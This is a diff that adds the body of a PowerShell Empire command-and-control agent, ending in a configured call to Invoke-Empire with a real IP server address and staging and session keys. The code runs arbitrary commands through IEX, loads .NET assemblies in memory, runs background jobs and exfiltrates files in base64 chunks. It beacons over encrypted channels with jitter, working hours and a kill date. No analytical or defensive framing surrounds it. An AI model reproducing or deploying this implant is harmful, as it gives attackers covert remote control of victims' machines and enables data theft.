+                                $out | Add-Member Noteproperty 'Interface' $($adapters[$_.InterfaceIndex] -join ",");
+                            }
+                            else {
+                                $out | Add-Member Noteproperty 'Interface' '127.0.0.1';
+                            }
+                            $out | Add-Member Noteproperty 'Metric' $_.Metric1;
+                            $out;
+                        } | ConvertTo-Json;
+                    }
+                    else { $output = route $cmdargs };
+                }
+                '(whoami|getuid)' { $output = [Security.Principal.WindowsIdentity]::GetCurrent().Name };
+                hostname {
+                    $output = [System.Net.Dns]::GetHostByName(($env:computerName));
+                }
+                '(reboot|restart)' { Restart-Computer -force };
+                shutdown { Stop-Computer -force };
+                default {
+                    if ($cmdargs.length -eq '') { $output = IEX $cmd | Out-String }
+                    else { $output = IEX "$cmd $cmdargs" | Out-String };
+                }
+            }
+        }
+        "`n"+($output);
+    }
+    function Start-AgentJob {
+        param($ScriptString)
+        $RandName = -join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 6);
+        $AppDomain = [AppDomain]::CreateDomain($RandName);
+        $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create();
+        $null = $PSHost.AddScript($ScriptString);
+        $Buffer = New-Object 'System.Management.Automation.PSDataCollection[PSObject]';
+        $PSobjectCollectionType = [Type]'System.Management.Automation.PSDataCollection[PSObject]';
+        $BeginInvoke = ($PSHost.GetType().GetMethods() | ? { $_.Name -eq 'BeginInvoke' -and $_.GetParameters().Count -eq 2 }).MakeGenericMethod(@([PSObject], [PSObject]));
+        $Job = $BeginInvoke.Invoke($PSHost, @(($Buffer -as $PSobjectCollectionType), ($Buffer -as $PSobjectCollectionType)));
+        $Script:Jobs[$RandName] = @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Job; 'Buffer'=$Buffer};
+        $RandName;
+    }
+    function Get-AgentJobCompleted {
+        param($JobName)
+        if($Script:Jobs.ContainsKey($JobName)) {
+            $Script:Jobs[$JobName]['Job'].IsCompleted;
+        }
+    }
+    function Receive-AgentJob {
+        param($JobName)
+        if($Script:Jobs.ContainsKey($JobName)) {
+            $Script:Jobs[$JobName]['Buffer'].ReadAll();
+        }
+    }
+    function Stop-AgentJob {
+        param($JobName)
+        if($Script:Jobs.ContainsKey($JobName)) {
+            $Null = $Script:Jobs[$JobName]['PSHost'].Stop();
+            $Script:Jobs[$JobName]['Buffer'].ReadAll();
+            $Null = [AppDomain]::Unload($Script:Jobs[$JobName]['AppDomain']);
+            $Script:Jobs.Remove($JobName);
+        }
+    }
+    function Update-Profile {
+        param($Profile)
+        $ProfileParts = $Profile.split('|');
+        $script:TaskURIs = $ProfileParts[0].split(',');
+        $script:UserAgent = $ProfileParts[1];
+        $script:SessionID = $SessionID;
+        $script:Headers = @{};
+        if($ProfileParts[2]) {
+            $ProfileParts[2..$ProfileParts.length] | ForEach-Object {
+                $Parts = $_.Split(':');
+                $script:Headers.Add($Parts[0],$Parts[1]);
+            }
+        }
+        "Agent updated with profile $Profile";
+    }
+    function Get-FilePart {
+        Param(
+            [string] $File,
+            [int] $Index = 0,
+            $ChunkSize = 512KB,
+            [switch] $NoBase64
+        )
+        try {
+            $f = Get-Item "$File";
+            $FileLength = $f.length;
+            $FromFile = [io.file]::OpenRead($File);
+            if ($FileLength -lt $ChunkSize) {
+                if($Index -eq 0) {
+                    $buff = new-object byte[] $FileLength;
+                    $count = $FromFile.Read($buff, 0, $buff.Length);
+                    if($NoBase64) {
+                        $buff;
+                    }
+                    else{
+                        [System.Convert]::ToBase64String($buff);
+                    }
+                }
+                else{
+                    $Null;
+                }
+            }
+            else{
+                $buff = new-object byte[] $ChunkSize;
+                $Start = $Index * $($ChunkSize);
+                $null = $FromFile.Seek($Start,0);
+                $count = $FromFile.Read($buff, 0, $buff.Length);
+                if ($count -gt 0) {
+                    if($count -ne $ChunkSize) {
+                        $buff2 = new-object byte[] $count;
+                        [array]::copy($buff, $buff2, $count);
+                        if($NoBase64) {
+                            $buff2
+                        }
+                        else{
+                            [System.Convert]::ToBase64String($buff2);
+                        }
+                    }
+                    else{
+                        if($NoBase64) {
+                            $buff;
+                        }
+                        else{
+                            [System.Convert]::ToBase64String($buff);
+                        }
+                    }
+                }
+                else{
+                    $Null;
+                }
+            }
+        }
+        catch{}
+        finally {
+            $FromFile.Close();
+        }
+    }
+    function Encrypt-Bytes {
+        param($bytes)
+        $IV = [byte] 0..255 | Get-Random -count 16;
+        try {
+            $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+        }
+        catch {
+            $AES=New-Object System.Security.Cryptography.RijndaelManaged;
+        }
+        $AES.Mode = "CBC";
+        $AES.Key = $Encoding.GetBytes($SessionKey);
+        $AES.IV = $IV;
+        $ciphertext = $IV + ($AES.CreateEncryptor()).TransformFinalBlock($bytes, 0, $bytes.Length);
+        $HMAC.Key = $Encoding.GetBytes($SessionKey);
+        $ciphertext + $hmac.ComputeHash($ciphertext)[0..9];
+    }
+    function Decrypt-Bytes {
+        param ($inBytes)
+        if($inBytes.Length -gt 32) {
+            $mac = $inBytes[-10..-1];
+            $inBytes = $inBytes[0..($inBytes.length - 11)];
+            $hmac.Key = $Encoding.GetBytes($SessionKey);
+            $expected = $hmac.ComputeHash($inBytes)[0..9];
+            if (@(Compare-Object $mac $expected -sync 0).Length -ne 0) {
+                return;
+            }
+            $IV = $inBytes[0..15];
+            try {
+                $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+            }
+            catch {
+                $AES=New-Object System.Security.Cryptography.RijndaelManaged;
+            }
+            $AES.Mode = "CBC";
+            $AES.Key = $Encoding.GetBytes($SessionKey);
+            $AES.IV = $IV;
+            ($AES.CreateDecryptor()).TransformFinalBlock(($inBytes[16..$inBytes.length]), 0, $inBytes.Length-16)
+        }
+    }
+    function New-RoutingPacket {
+        param($EncData, $Meta)
+        if($EncData) {
+            $EncDataLen = $EncData.Length;
+        }
+        else {
+            $EncDataLen = 0;
+        }
+        $SKB = $Encoding.GetBytes($StagingKey);
+        $IV=[BitConverter]::GetBytes($(Get-Random));
+        $Data = $Encoding.GetBytes($script:SessionID) + @(0x01,$Meta,0x00,0x00) + [BitConverter]::GetBytes($EncDataLen);
+        $RoutingPacketData = ConvertTo-Rc4ByteStream -In $Data -RCK $($IV+$SKB);
+        if($EncData) {
+            ($IV + $RoutingPacketData + $EncData);
+        }
+        else {
+            ($IV + $RoutingPacketData);
+        }
+    }
+    function Decode-RoutingPacket {
+        param($PacketData)
+        if ($PacketData.Length -ge 20) {
+            $Offset = 0;
+            while($Offset -lt $PacketData.Length) {
+                $RoutingPacket = $PacketData[($Offset+0)..($Offset+19)];
+                $RoutingIV = $RoutingPacket[0..3];
+                $RoutingEncData = $RoutingPacket[4..19];
+                $Offset += 20;
+                $SKB = $Encoding.GetBytes($StagingKey);
+                $RoutingData = ConvertTo-Rc4ByteStream -In $RoutingEncData -RCK $($RoutingIV+$SKB);
+                $PacketSessionID = [System.Text.Encoding]::UTF8.GetString($RoutingData[0..7]);
+                $Language = $RoutingData[8];
+                $Meta = $RoutingData[9];
+                $Extra = $RoutingData[10..11];
+                $PacketLength = [BitConverter]::ToUInt32($RoutingData, 12);
+                if ($PacketLength -lt 0) {
+                    break;
+                }
+                if ($PacketSessionID -eq $script:SessionID) {
+                    $EncData = $PacketData[$Offset..($Offset+$PacketLength-1)];
+                    $Offset += $PacketLength;
+                    Process-TaskingPackets $EncData;
+                }
+                else {
+                }
+            }
+        }
+        else {
+        }
+    }
+    function Encode-Packet {
+        param([Int16]$type, $data, [Int16]$ResultID=0)
+        if ($data -is [System.Array]) {
+            $data = $data -join "`n";
+        }
+        $data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data));
+        $packet = New-Object Byte[] (12 + $data.Length);
+        ([BitConverter]::GetBytes($type)).CopyTo($packet, 0);
+        ([BitConverter]::GetBytes([Int16]1)).CopyTo($packet, 2);
+        ([BitConverter]::GetBytes([Int16]1)).CopyTo($packet, 4);
+        ([BitConverter]::GetBytes($ResultID)).CopyTo($packet, 6);
+        ([BitConverter]::GetBytes($data.Length)).CopyTo($packet, 8);
+        ([System.Text.Encoding]::UTF8.GetBytes($data)).CopyTo($packet, 12);
+        $packet;
+    }
+    function Decode-Packet {
+        param($packet, $offset=0)
+        $Type = [BitConverter]::ToUInt16($packet, 0+$offset);
+        $TotalPackets = [BitConverter]::ToUInt16($packet, 2+$offset);
+        $PacketNum = [BitConverter]::ToUInt16($packet, 4+$offset);
+        $TaskID = [BitConverter]::ToUInt16($packet, 6+$offset);
+        $Length = [BitConverter]::ToUInt32($packet, 8+$offset);
+        $Data = [System.Text.Encoding]::UTF8.GetString($packet[(12+$offset)..(12+$Length+$offset-1)]);
+        $Remaining = [System.Text.Encoding]::UTF8.GetString($packet[(12+$Length+$offset)..($packet.Length)]);
+        Remove-Variable packet;
+        @($Type, $TotalPackets, $PacketNum, $TaskID, $Length, $Data, $Remaining);
+    }
+    function Process-Tasking {
+        param($type, $msg, $ResultID)
+        try {
+            if($type -eq 1) {
+                return Encode-Packet -type $type -data $(Get-Sysinfo) -ResultID $ResultID;
+            }
+            elseif($type -eq 2) {
+                $msg = "[!] Agent "+$script:SessionID+" exiting";
+                (& $SendMessage -Packets $(Encode-Packet -type $type -data $msg -ResultID $ResultID));
+                exit;
+            }
+            elseif($type -eq 34) {
+                Encode-Packet -type 0 -data '[!] Proxy chain not implemented' -ResultID $ResultID;
+            }
+            elseif($type -eq 40) {
+                $parts = $data.Split(" ");
+                if($parts.Length -eq 1) {
+                    $cmd = $parts[0];
+                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd) -join "`n").trim() -ResultID $ResultID;
+                }
+                else{
+                    $cmd = $parts[0];
+                    $cmdargs = $parts[1..$parts.length] -join " ";
+                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd -cmdargs $cmdargs) -join "`n").trim() -ResultID $ResultID;
+                }
+            }
+            elseif($type -eq 41) {
+                try {
+                    $ChunkSize = 512KB;
+                    $Parts = $Data.Split(" ");
+                    if($Parts.Length -gt 1) {
+                        $Path = $Parts[0..($parts.length-2)] -join " ";
+                        try {
+                            $ChunkSize = $Parts[-1]/1;
+                            if($Parts[-1] -notlike "*b*") {
+                                $ChunkSize = $ChunkSize * 1024;
+                            }
+                        }
+                        catch {
+                            $Path += " $($Parts[-1])";
+                        }
+                    }
+                    else {
+                        $Path = $Data;
+                    }
+                    $Path = $Path.Trim('"').Trim("'");
+                    if($ChunkSize -lt 512KB) {
+                        $ChunkSize = 512KB;
+                    }
+                    elseif($ChunkSize -gt 8MB) {
+                        $ChunkSize = 8MB;
+                    }
+                    else {
+                        $ChunkSize = 1024KB;
+                    }
+                    $Path = Get-Childitem -Recurse $Path -File  | ForEach-Object {$_.FullName};
+                    foreach ( $File in $Path) {
+                        $Index = 0;
+                        do{
+                            $EncodedPart = Get-FilePart -File "$file" -Index $Index -ChunkSize $ChunkSize;
+                            $filesize = (Get-Item $file).length;
+                            if($EncodedPart) {
+                                $data = "{0}|{1}|{2}|{3}" -f $Index, $file, $filesize, $EncodedPart;
+                                (& $SendMessage -Packets $(Encode-Packet -type $type -data $($data) -ResultID $ResultID));
+                                $Index += 1;
+                                if ($script:AgentDelay -ne 0) {
+                                    $min = [int]((1-$script:AgentJitter)*$script:AgentDelay);
+                                    $max = [int]((1+$script:AgentJitter)*$script:AgentDelay);
+                                    if ($min -eq $max) {
+                                        $sleepTime = $min;
+                                    }
+                                    else{
+                                        $sleepTime = Get-Random -minimum $min -maximum $max;
+                                    }
+                                    Start-Sleep -s $sleepTime;
+                                }
+                            }
+                            [GC]::Collect();
+                        } while($EncodedPart)
+                        Encode-Packet -type 40 -data "[*] File download of $file completed" -ResultID $ResultID;
+                    }
+                }
+                catch {
+                    Encode-Packet -type 0 -data '[!] File does not exist or cannot be accessed' -ResultID $ResultID;
+                }
+            }
+            elseif($type -eq 42) {
+                $parts = $data.split('|');
+                $filename = $parts[0];
+                $base64part = $parts[1];
+                $Content = [System.Convert]::FromBase64String($base64part);
+                try{
+                    Set-Content -Path $filename -Value $Content -Encoding Byte -ErrorAction Stop -ErrorVariable error
+                    Encode-Packet -type $type -data "[*] Upload of $fileName successful" -ResultID $ResultID;
+                }
+                catch {
+                    Encode-Packet -type 0 -data $error -ResultID $ResultID;
+                }
+            }
+            elseif($type -eq 43) {
+                $output = "";
+                $path = "/";
+                if ($data.length -gt 1) {
+                    $path = $data;
+                }
+                if ($path -eq "/") {
+                    $array = @();
+                    $drives = Get-PSDrive -PSProvider FileSystem |where {($_.Used -gt 0)} | ForEach-Object {
+                        $array += (@{path =  $_.Root; name = $_.Root; is_file = $false});
+                    }
+                    $output = @{directory_name = "/"; directory_path = "/"; items = $array} | ConvertTo-Json -Compress;
+                } elseif (-Not (Test-Path $path -PathType Container)) {
+                    $output = "Directory " + $path + " not found.";
+                } else {
+                    $array = @();
+                    Get-ChildItem -force -Path $path -Attributes !directory | foreach-object { $array += (@{ path = $_.FullName; name = $_.Name; is_file = $true }) };
+                    Get-ChildItem -force -Path $path -Attributes directory | foreach-object { $array += (@{ path = $_.FullName; name = $_.Name; is_file = $false }) };
+                    $directory = Get-Item -force -Path $path;
+                    $output = @{ directory_name = $directory.Name; directory_path = $directory.FullName; items = $array } | ConvertTo-Json -Compress;
+                    if ($directory -eq $null)
+                    {
+                        $output = "User does not have access to directory " + $path;
+                    }
+                }
+                Encode-Packet -data $output -type $type -ResultID $ResultID;
+            }
+            elseif($type -eq 44){
+                try{
+                    $parts = $data.split(",");
+                    $params = $parts[1..$parts.length];
+                    $bytes = [System.Convert]::FromBase64String($parts[0]);
+                    $ms = New-Object System.IO.MemoryStream;
+                    $output = New-Object System.IO.MemoryStream;
+                    $ms.Write($bytes, 0, $bytes.Length);
+                    $ms.Seek(0,0) | Out-Null;
+                    $sr = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress);
+                    $buffer = [System.Byte[]]::CreateInstance([System.Byte],4096);
+                    $bytesRead = $sr.Read($buffer, 0, $buffer.length);
+                    while($bytesRead -ne 0){
+                        $output.Write($buffer,0,$bytesRead);
+                        $bytesRead = $sr.Read($buffer, 0, $buffer.length);
+                    }
+                    $assemBytes = $output.ToArray();
+                    $assem = [Reflection.Assembly]::load($assemBytes);
+                    $strmprop = $assem.GetType("Task").GetProperty("OutputStream");
+                    if(!$strmprop){
+                        $Results = $assem.GetType("Task").GetMethod("Execute").Invoke($null, $params);
+                    }
+                    else{
+                        $pipeServerStream = [System.IO.Pipes.AnonymousPipeServerStream]::new([System.IO.Pipes.PipeDirection]::In, [System.IO.HandleInheritability]::Inheritable);
+                        $pipeClientStream = [System.IO.Pipes.AnonymousPipeClientStream]::new([System.IO.Pipes.PipeDirection]::Out, $pipeServerStream.ClientSafePipeHandle);
+                        $streamReader = [System.IO.StreamReader]::new($pipeServerStream);
+                        $dict = @{"assembly" = $assem; "params" = $params; "pipe" = $pipeClientStream};
+                        $ps = [PowerShell]::Create();
+                        $task = $ps.AddScript('
+                        [CmdletBinding()]
+                        param(
+                            [System.Reflection.Assembly]
+                            $assembly,
+                            [String[]]
+                            $params,
+                            [IO.Pipes.AnonymousPipeClientStream]
+                            $Pipe
+                        )
+                        try {
+                            $streamProp = $assembly.GetType("Task").GetProperty("OutputStream");
+                            $streamProp.SetValue($null, $pipe, $null);
+                            $assembly.GetType("Task").GetMethod("Execute").Invoke($null,$params);
+                            }
+                        finally {
+                            $pipe.Dispose();
+                            }
+').AddParameters($dict).BeginInvoke();
+                        $pipeOutput = [Text.StringBuilder]::new();
+                        $buffer = [char[]]::new($pipeServerStream.InBufferSize);
+                        while ($read = $streamReader.Read($buffer, 0, $buffer.Length)) {
+                            [void]$pipeOutput.Append($buffer, 0, $read);
+                        }
+                        $ps.EndInvoke($task);
+                        $Results = $pipeOutput.ToString();
+                    }
+                    Encode-Packet -data $results -type 40 -ResultID $ResultID;
+                }
+                catch {
+                    Encode-Packet -type 0 -data '[!] Error while executing assembly' -ResultID $ResultID;
+                }
+            }
+            elseif($type -eq 50) {
+                $Downloads = $Script:Jobs.Keys -join "`n";
+                Encode-Packet -data ("Running Jobs:`n$Downloads") -type $type -ResultID $ResultID;
+            }
+            elseif($type -eq 51) {
+                $JobName = $data;
+                $JobResultID = $ResultIDs[$JobName];
+                try {
+                    $Results = Stop-AgentJob -JobName $JobName | fl | Out-String;
+                    if($Results -and $($Results.trim() -ne '')) {
+                        Encode-Packet -type $type -data $($Results) -ResultID $JobResultID;
+                    }
+                    Encode-Packet -type 51 -data "Job $JobName killed." -ResultID $JobResultID;
+                }
+                catch {
+                    Encode-Packet -type 0 -data "[!] Error in stopping job: $JobName" -ResultID $JobResultID;
+                }
+            }
+            elseif($type -eq 60) {
+                Encode-Packet -type 0 -data '[!] SOCKS server not implemented' -ResultID $ResultID;
+            }
+            elseif($type -eq 61) {
+                Encode-Packet -type 0 -data '[!] SOCKS server data not implemented' -ResultID $ResultID;
+            }
+            elseif($type -eq 100 -or $type -eq 118) {
+                $ResultData = IEX $data;
+                if($ResultData) {
+                    Encode-Packet -type $type -data $ResultData -ResultID $ResultID;
+                }
+            }
+            elseif($type -eq 101 -or $type -eq 119) {
+                $prefix = $data.Substring(0,15);
+                $extension = $data.Substring(15,5);
+                $data = $data.Substring(20);
+                Encode-Packet -type $type -data ($prefix + $extension + (IEX $data)) -ResultID $ResultID;
+            }
+            elseif($type -eq 110 -or $type -eq 112) {
+                $jobID = Start-AgentJob $data;
+                $script:ResultIDs[$jobID]=$resultID;
+                Encode-Packet -type $type -data ("Job started: " + $jobID) -ResultID $ResultID;
+            }
+            elseif($type -eq 111 -or $type -eq 113) {
+                Encode-Packet -type 0 -data '[!] Dynamic code execution, no wait, save output not implemented' -ResultID $ResultID;
+            }
+            elseif($type -eq 120) {
+                $script:ImportedScript = Encrypt-Bytes $Encoding.GetBytes($data);
+                Encode-Packet -type $type -data "script successfully saved in memory" -ResultID $ResultID;
+            }
+            elseif($type -eq 121) {
+                $script = Decrypt-Bytes $script:ImportedScript;
+                if ($script) {
+                    $jobID = Start-AgentJob ([System.Text.Encoding]::UTF8.GetString($script) + "; $data");
+                    $script:ResultIDs[$jobID]=$ResultID;
+                    Encode-Packet -type $type -data ("Job started: " + $jobID) -ResultID $ResultID;
+                }
+            }
+            elseif($type -eq 130) {
+                try {
+                    IEX $data
+                    Encode-Packet -type $type -data "[+] Switched the current listener to: $CurrentListenerName" -ResultID $ResultID;
+                }
+                catch {
+                    Encode-Packet -type 0 -data ("[!] Unable to update agent comm methods: $_") -ResultID $ResultID;
+                }
+            }
+            elseif($type -eq 131) {
+                $script:CurrentListenerName = $data;
+                Encode-Packet -type $type -data "[+] Updated the CurrentListenerName to: $CurrentListenerName" -ResultID $ResultID;
+            }
+            else{
+                Encode-Packet -type 0 -data "[!] invalid type: $type" -ResultID $ResultID;
+            }
+        }
+        catch [System.Exception] {
+            Encode-Packet -type $type -data "[!] error running command: $_" -ResultID $ResultID;
+        }
+    }
+    function Process-TaskingPackets {
+        param($Tasking)
+        $TaskingBytes = Decrypt-Bytes $Tasking;
+        if (-not $TaskingBytes) {
+            return;
+        }
+        $Decoded = Decode-Packet $TaskingBytes;
+        $Type = $Decoded[0];
+        $TotalPackets = $Decoded[1];
+        $PacketNum = $Decoded[2];
+        $TaskID = $Decoded[3];
+        $Length = $Decoded[4];
+        $Data = $Decoded[5];
+        $Remaining = $Decoded[6];
+        $ResultPackets = $(Process-Tasking $Type $Data $TaskID);
+        $Offset = 12 + $Length;
+        while($Remaining.Length -ne 0) {
+            $Decoded = Decode-Packet $TaskingBytes $Offset;
+            $Type = $Decoded[0];
+            $TotalPackets = $Decoded[1];
+            $PacketNum = $Decoded[2];
+            $TaskID = $Decoded[3];
+            $Length = $Decoded[4];
+            $Data = $Decoded[5];
+            if ($Decoded.Count -eq 7) {$Remaining = $Decoded[6]};
+            $ResultPackets += $(Process-Tasking $Type $Data $TaskID);
+            $Offset += $(12 + $Length);
+        }
+        (& $SendMessage -Packets $ResultPackets);
+    }
+    while ($True) {
+        if ( (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) -or ((!($script:LostLimit -eq 0)) -and ($script:MissedCheckins -gt $script:LostLimit)) ) {
+            $Packets = $null;(& $GetTask);
+            ForEach($JobName in $Script:Jobs.Keys) {
+                $Results = Stop-AgentJob -JobName $JobName | fl | Out-String;
+                $JobResultID = $script:ResultIDs[$JobName];
+                $Packets += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID);
+                $script:ResultIDs.Remove($JobName);
+            }
+            if ($Packets) {
+                (& $SendMessage -Packets $Packets);
+            }
+            if (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) {
+                $msg = "[!] Agent "+$script:SessionID+" exiting: past killdate";
+            }
+            else {
+                $msg = "[!] Agent "+$script:SessionID+" exiting: Lost limit reached";
+            }
+            (& $SendMessage -Packets $(Encode-Packet -type 2 -data $msg));
+            exit;
+        }
+        if ($script:WorkingHours -match '^[0-9]{1,2}:[0-5][0-9]-[0-9]{1,2}:[0-5][0-9]$') {
+            $current = Get-Date;
+            $start = Get-Date ($script:WorkingHours.split("-")[0]);
+            $end = Get-Date ($script:WorkingHours.split("-")[1]);
+            if (($end-$start).hours -lt 0) {
+                $start = $start.AddDays(-1);
+            }
+            $startCheck = $current -ge $start;
+            $endCheck = $current -le $end;
+            if ((-not $startCheck) -or (-not $endCheck)) {
+                $sleepSeconds = ($start - $current).TotalSeconds;
+                if($sleepSeconds -lt 0) {
+                    $sleepSeconds = ($start.addDays(1) - $current).TotalSeconds;
+                }
+                Start-Sleep -Seconds $sleepSeconds;
+            }
+        }
+        if ($script:AgentDelay -ne 0) {
+            $SleepMin = [int]((1-$script:AgentJitter)*$script:AgentDelay);
+            $SleepMax = [int]((1+$script:AgentJitter)*$script:AgentDelay);
+            if ($SleepMin -eq $SleepMax) {
+                $SleepTime = $SleepMin;
+            }
+            else{
+                $SleepTime = Get-Random -Minimum $SleepMin -Maximum $SleepMax;
+            }
+            Start-Sleep -Seconds $sleepTime;
+        }
+        $JobResults = $Null;
+        ForEach($JobName in $Script:Jobs.Keys) {
+            $JobResultID = $script:ResultIDs[$JobName];
+            if(Get-AgentJobCompleted -JobName $JobName) {
+                $Results = Stop-AgentJob -JobName $JobName | fl | Out-String;
+            }
+            else {
+                $Results = Receive-AgentJob -JobName $JobName | fl | Out-String;
+            }
+            if($Results) {
+                $JobResults += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID);
+            }
+        }
+        if ($JobResults) {
+            ((& $SendMessage -Packets $JobResults));
+        }
+        $TaskData = (& $GetTask);
+        if ($TaskData) {
+            $script:MissedCheckins = 0;
+            if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $script:DefaultResponse) {
+                Decode-RoutingPacket -PacketData $TaskData;
+            }
+        }
+        [GC]::Collect();
+    }
+}
+
+Invoke-Empire -Servers @('http://139.180.171.110:22161') -StagingKey 'Dwf<aIHl*J@4W2?OmehLQCG5;1A!RTo~' -SessionKey '\k3C.gH+<zFMp$%t0fhlbYj#_EmAUSa^' -SessionID 'SMWBG3A7' -WorkingHours '' -KillDate '';
